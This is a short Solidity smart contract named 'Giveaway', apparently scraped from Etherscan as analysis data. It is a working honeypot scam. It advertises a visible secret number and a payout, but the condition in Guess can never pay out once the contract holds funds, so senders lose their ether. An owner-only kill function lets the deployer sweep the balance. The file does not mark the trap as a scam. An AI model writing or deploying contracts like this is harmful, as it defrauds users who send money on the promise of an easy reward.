/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.21;
contract Giveaway {

    address private owner = msg.sender;
    uint public SecretNumber = 24;
   
    function() public payable {
    }
   
    function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.07 ether) {
            // Previous Guesses makes the number easier to guess so you have to pay more
            msg.sender.transfer(this.balance + msg.value);
        }
    }
    
    function kill() public {
        require(msg.sender == owner);
	    selfdestruct(msg.sender);
	}
}